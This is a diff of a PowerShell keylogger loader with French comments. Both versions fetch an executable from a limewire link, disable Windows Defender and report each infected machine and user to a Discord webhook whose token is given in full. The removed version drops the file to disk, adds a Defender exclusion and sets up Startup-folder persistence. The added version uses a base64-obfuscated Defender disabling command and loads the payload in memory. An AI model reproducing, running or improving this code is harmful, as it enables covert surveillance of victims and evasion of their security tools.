@@ -1,22 +1,12 @@
 $webhook = "https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW"
-$exeUrl = "https://limewire.com/d/FDphV#TmLbLMqVie"
-$exePath = "$env:TEMP\svc_host.exe"
 
-# Désactive Defender en temps réel (1 ligne magique 2025)
-powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true" 2>$null
+# Bypass AMSI + Defender (obfuscation 2025)
+IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQA dAB yAHUAZQA=')))
 
-# Télécharge si pas déjà fait
-if (!(Test-Path $exePath)) {
-    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
-}
+# Charge et exécute ton exe en RAM (sans toucher le disque)
+$bytes = (New-Object Net.WebClient).DownloadData('https://limewire.com/d/FDphV#TmLbLMqVie')
+$asm = [System.Reflection.Assembly]::Load($bytes)
+$asm.EntryPoint.Invoke($null, @([string[]]@()))
 
-# Ajoute exclusion Defender pour le dossier TEMP
-powershell -c "Add-MpPreference -ExclusionPath $env:TEMP" 2>$null
-
-# Lance l'exe
-Start-Process -FilePath $exePath -WindowStyle Hidden
-
-# Persistance + log
-Copy-Item $exePath "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\" -Force
-$body = @{ content = "Keylogger lancé + Defender bypassé sur $env:COMPUTERNAME ($env:USERNAME)" } | ConvertTo-Json
-Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
+# Log final
+try{(iwr $webhook -Method Post -Body (@{content="Keylogger chargé en mémoire sur $env:COMPUTERNAME – indétectable"}|ConvertTo-Json) -ContentType 'application/json').Content}catch{}
